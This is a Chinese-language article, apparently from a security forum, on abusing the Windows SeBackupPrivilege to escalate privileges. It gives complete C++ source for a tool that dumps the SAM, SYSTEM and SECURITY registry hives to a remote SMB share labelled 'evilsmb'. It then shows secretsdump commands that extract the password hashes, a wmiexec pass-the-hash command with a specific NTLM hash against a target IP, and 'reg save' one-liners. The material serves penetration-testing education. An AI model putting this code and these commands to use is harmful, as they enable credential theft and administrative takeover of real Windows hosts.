SeBackupPrivilege
-----------------

### 禁止任何公众号/营销号转发

SeBackupPrivilege 特权在 Microsoft 官方文档中被描述为 “*Back up files and directories*”，拥有该特权的任何进程被授予对任何文件或对象的所有读取访问控制，而不管为文件或对象指定的访问控制列表（ACL）。除读取之外的任何访问请求仍使用 ACL 进行评估。

滥用该特权，我们可以调用 `RegSaveKeyW()` 函数将 SAM 注册表转储到本地文件中，如下所示。

```c++
// Saves the specified key and all of its subkeys and values to a new file.
lResult = RegSaveKeyW(hKey, std::wstring(savePath).append(L"\\").append(subKeys[i]).c_str(), NULL);
if (lResult != ERROR_SUCCESS)
{
    wprintf(L"[-] RegSaveKeyW Error: [%u].\n", lResult);
    return status;
}
wprintf(L"[*] Dump %s hive successfully.\n", subKeys[i]);
```

然后从转储文件中读取本地管理员帐户的密码哈希值，得到的管理员用户哈希可以用来执行哈希传递，并获取系统管理权限。

下面给出可供参考的利用代码，首先通过 `AdjustTokenPrivileges()` 函数为当前进程开启 SeBackupPrivilege 特权，然后调用 `RegOpenKeyExW()` 函数打开并读取 `HKLM\SAM`、`HKLM\SECURITY` 和`HKLM\SYSTEM` 注册表，最后用 `RegSaveKeyW()` 函数将上述注册表保存到文件。

- SeBackupPrivilege.cpp

```c++
#include <Windows.h>
#include <iostream>
#include <stdio.h>

BOOL ExploitSeBackupPrivilege(LPCWSTR savePath)
{
    BOOL status = FALSE;
    DWORD lResult;
    HKEY hKey;
    LPCWSTR subKeys[] = { L"SAM", L"SYSTEM",L"SECURITY" };

    for (int i = 0; i < 3; i++)
    {
        // Opens the specified registry key.
        lResult = RegOpenKeyExW(HKEY_LOCAL_MACHINE, subKeys[i], REG_OPTION_BACKUP_RESTORE, KEY_READ, &hKey);
        if (lResult != ERROR_SUCCESS)
        {
            wprintf(L"[-] RegOpenKeyExW Error: [%u].\n", lResult);
            return status;
        }
        // Saves the specified key and all of its subkeys and values to a new file.
        lResult = RegSaveKeyW(hKey, std::wstring(savePath).append(L"\\").append(subKeys[i]).c_str(), NULL);
        if (lResult != ERROR_SUCCESS)
        {
            wprintf(L"[-] RegSaveKeyW Error: [%u].\n", lResult);
            return status;
        }
        wprintf(L"[*] Dump %s hive successfully.\n", subKeys[i]);
        status = TRUE;
    }
    return status;
}

BOOL EnableTokenPrivilege(HANDLE hToken, LPCWSTR lpName)
{
    BOOL status = FALSE;
    LUID luidValue = { 0 };
    TOKEN_PRIVILEGES tokenPrivileges;

    // Get the LUID value of the privilege for the local system
    if (!LookupPrivilegeValueW(NULL, lpName, &luidValue))
    {
        wprintf(L"[-] LookupPrivilegeValue Error: [%u].\n", GetLastError());
        return status;
    }

    // Set escalation information
    tokenPrivileges.PrivilegeCount = 1;
    tokenPrivileges.Privileges[0].Luid = luidValue;
    tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Elevate Process Token Access
    if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(tokenPrivileges), NULL, NULL))
    {
        wprintf(L"[-] AdjustTokenPrivileges Error: [%u].\n", GetLastError());
        return status;
    }
    else
    {
        status = TRUE;
    }
    return status;
}

void PrintUsage()
{
    wprintf(
        L"Abuse of SeBackupPrivilege by @WHOAMI (whoamianony.top)\n\n"
        L"Arguments:\n"
        L"  -h           Show this help message and exit\n"
        L"  -o <PATH>    Where to store the sam / system / security files (can be UNC path)\n"
    );
}

int wmain(int argc, wchar_t* argv[])
{
    HANDLE hToken    = NULL;
    LPCWSTR savePath = L"C:\\Users\\Public";

    while ((argc > 1) && (argv[1][0] == '-'))
    {
        switch (argv[1][1])
        {
        case 'h':
            PrintUsage();
            return 0;
        case 'o':
            ++argv;
            --argc;
            if (argc > 1 && argv[1][0] != '-')
            {
                savePath = (LPCWSTR)argv[1];
            }
            break;
        default:
            wprintf(L"[-] Invalid Argument: %s.\n", argv[1]);
            PrintUsage();
            return 0;
        }

        ++argv;
        --argc;
    }

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
    {
        wprintf(L"[-] OpenProcessToken Error: [%u].\n", GetLastError());
        return 0;
    }
    // Enable SeBackupPrivilege for the current process token.
    if (EnableTokenPrivilege(hToken, SE_BACKUP_NAME))
    {
        if (ExploitSeBackupPrivilege(savePath))
        {
            return 1;
        }
    }
}
```

将编译并生成好的 SeBackupPrivilege.exe 上传到目标主机，执行以下命令，将 SAM 注册表转储并导出到文件。这里通过 `-o` 选项指定保存的路径，笔者指定 UNC 路径将注册表保存到远程共享中，避免当前用户在本地系统上没有写入权限的情况，如下所示。

```c++
SeBackupPrivilege.exe -o \\172.26.10.128\evilsmb
```

![image-20230208220939973](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-8c7a54a078bf34eabdff5f5f128eee2b5de31658.png)

接着，我们通过解析 SAM 数据库获得本地管理员的哈希，如下图所示。

```bash
python3 secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```

![image-20230208214808892](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-9424329e0a5b5bfe139a058b0dc29c69a768bd07.png)

最后，使用管理员哈希执行哈希传递，获取目标系统管理权限，如下图所示。

```bash
python3 wmiexec.py ./Administrator@172.26.10.21 -hashes :cb136a448767792bae25563a498a86e6
```

![image-20230208214159428](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-8c4c78e42ceb49cd845b50078f2c07ff7ac677e8.png)

当然，我们可以直接通过 `reg save` 命令将 SAM 注册表导出，如下图所示。这是因为在 `reg` 命令内部会自动调用 `AdjustTokenPrivileges()` 函数为当前进程开启 SeBackupPrivilege 特权。

```cmd
reg save HKLM\SAM C:\Users\Public\SAM
reg save HKLM\SYSTEM C:\Users\Public\SYSTEM
```

![image-20230208220621473](https://shs3.b.qianxin.com/attack_forum/2023/06/attach-466e306e267bdadb3d40f93012d77b9941411cc1.png)